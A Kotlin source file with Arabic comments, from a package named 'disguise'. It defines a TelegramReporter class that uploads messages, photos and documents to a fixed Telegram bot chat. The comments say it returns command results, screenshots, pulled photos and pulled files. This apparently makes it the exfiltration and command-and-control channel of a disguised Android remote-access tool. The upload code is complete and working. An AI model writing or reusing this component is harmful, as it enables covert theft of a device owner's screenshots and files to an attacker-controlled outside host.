package com.example.disguise.core

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * TelegramReporter — يرسل الردود والملفات إلى تيليجرام.
 *
 * المسؤوليات:
 * 1. sendMessage: إرسال نصوص (ردود الأوامر، الأخطاء، النتائج).
 * 2. sendPhoto: إرسال صورة (لقطات شاشة، صور مسحوبة).
 * 3. sendDocument: إرسال ملفات (سحب الملفات، تقارير).
 * 4. sendChatAction: إظهار "يكتب..." لإعلام المستخدم بأن الأمر قيد التنفيذ.
 *
 * قيود Telegram API:
 * - sendMessage: حد 4096 حرف لكل رسالة (نقسّم تلقائياً).
 * - sendPhoto: حد 10MB.
 * - sendDocument: حد 50MB (للبوتات).
 * - يجب استخدام multipart/form-data لرفع الملفات.
 *
 * ملاحظة: كل الدوال suspend، تُستدعى من coroutines فقط.
 */
class TelegramReporter(
    private val botToken: String,
    private val chatId: String
) {

    companion object {
        private const val TAG = "TelegramReporter"
        private const val BASE_URL = "https://api.telegram.org/bot"
        private const val MAX_MESSAGE_LEN = 4096
        private const val MAX_PHOTO_BYTES = 10L * 1024 * 1024   // 10MB
        private const val MAX_DOC_BYTES = 50L * 1024 * 1024     // 50MB

        private val httpClient: OkHttpClient by lazy {
            OkHttpClient.Builder()
                .connectTimeout(20, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .writeTimeout(120, TimeUnit.SECONDS)   // رفع الملفات قد يستغرق وقتاً
                .retryOnConnectionFailure(true)
                .build()
        }
    }

    /**
     * إرسال رسالة نصية. تُقسَّم تلقائياً إذا تجاوزت 4096 حرف.
     */
    suspend fun sendMessage(text: String) {
        if (text.isBlank()) return
        val chunks = splitMessage(text)
        for (chunk in chunks) {
            sendSingleMessage(chunk)
        }
    }

    private suspend fun sendSingleMessage(text: String) {
        val url = "$BASE_URL$botToken/sendMessage"
        val json = JSONObject().apply {
            put("chat_id", chatId)
            put("text", text)
            put("disable_web_page_preview", true)
        }
        val body = json.toString()
            .toRequestBody("application/json; charset=utf-8".toMediaType())
        val request = Request.Builder().url(url).post(body).build()

        withContext(Dispatchers.IO) {
            try {
                httpClient.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        Log.e(TAG, "sendMessage HTTP ${response.code}: ${response.body?.string()}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "sendMessage error: ${e.message}", e)
            }
        }
    }

    /**
     * إرسال صورة (sendPhoto).
     * - إذا تجاوزت 10MB، نرسلها كـ document بدلاً من photo.
     */
    suspend fun sendPhoto(file: File, caption: String? = null) {
        if (!file.exists()) {
            sendMessage("⚠️ الملف غير موجود: ${file.absolutePath}")
            return
        }
        if (file.length() > MAX_PHOTO_BYTES) {
            Log.w(TAG, "photo too large (${file.length()} bytes), sending as document")
            sendDocument(file, caption)
            return
        }
        val url = "$BASE_URL$botToken/sendPhoto"
        val multipart = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart(
                "photo",
                file.name,
                file.asRequestBody("image/*".toMediaType())
            )
            .apply { caption?.let { addFormDataPart("caption", it.take(1024)) } }
            .build()

        val request = Request.Builder().url(url).post(multipart).build()
        executeUpload(request, "sendPhoto")
    }

    /**
     * إرسال ملف (sendDocument).
     * - إذا تجاوز 50MB، نرسل إشعاراً بالفشل (Telegram Bot API لا يسمح بأكثر).
     */
    suspend fun sendDocument(file: File, caption: String? = null) {
        if (!file.exists()) {
            sendMessage("⚠️ الملف غير موجود: ${file.absolutePath}")
            return
        }
        if (file.length() > MAX_DOC_BYTES) {
            sendMessage("⚠️ الملف كبير جداً (${file.length() / 1024 / 1024}MB) — الحد 50MB")
            return
        }
        val url = "$BASE_URL$botToken/sendDocument"
        val multipart = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart(
                "document",
                file.name,
                file.asRequestBody("application/octet-stream".toMediaType())
            )
            .apply { caption?.let { addFormDataPart("caption", it.take(1024)) } }
            .build()

        val request = Request.Builder().url(url).post(multipart).build()
        executeUpload(request, "sendDocument")
    }

    /**
     * إظهار "يكتب..." في المحادثة.
     * action: "typing" أو "upload_photo" أو "upload_document"
     */
    suspend fun sendChatAction(action: String = "typing") {
        val url = "$BASE_URL$botToken/sendChatAction"
        val json = JSONObject().apply {
            put("chat_id", chatId)
            put("action", action)
        }
        val body = json.toString()
            .toRequestBody("application/json; charset=utf-8".toMediaType())
        val request = Request.Builder().url(url).post(body).build()

        withContext(Dispatchers.IO) {
            try {
                httpClient.newCall(request).execute().use { /* تجاهل الرد */ }
            } catch (e: Exception) {
                Log.e(TAG, "sendChatAction error: ${e.message}")
            }
        }
    }

    /**
     * تنفيذ طلب رفع (multipart) مع تسجيل الأخطاء.
     */
    private suspend fun executeUpload(request: Request, label: String) {
        withContext(Dispatchers.IO) {
            try {
                httpClient.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        Log.e(TAG, "$label HTTP ${response.code}: ${response.body?.string()}")
                    } else {
                        Log.d(TAG, "$label success")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "$label error: ${e.message}", e)
            }
        }
    }

    /**
     * تقسيم رسالة طويلة إلى أجزاء <= 4096 حرف.
     * يحاول التقسيم عند أسطر جديدة لتجنب قطع الكلمات.
     */
    private fun splitMessage(text: String): List<String> {
        if (text.length <= MAX_MESSAGE_LEN) return listOf(text)
        val chunks = mutableListOf<String>()
        var remaining = text
        while (remaining.isNotEmpty()) {
            if (remaining.length <= MAX_MESSAGE_LEN) {
                chunks.add(remaining)
                break
            }
            var cut = MAX_MESSAGE_LEN
            val newline = remaining.lastIndexOf('\n', MAX_MESSAGE_LEN - 1)
            if (newline > MAX_MESSAGE_LEN / 2) cut = newline + 1
            chunks.add(remaining.substring(0, cut))
            remaining = remaining.substring(cut)
        }
        return chunks
    }
}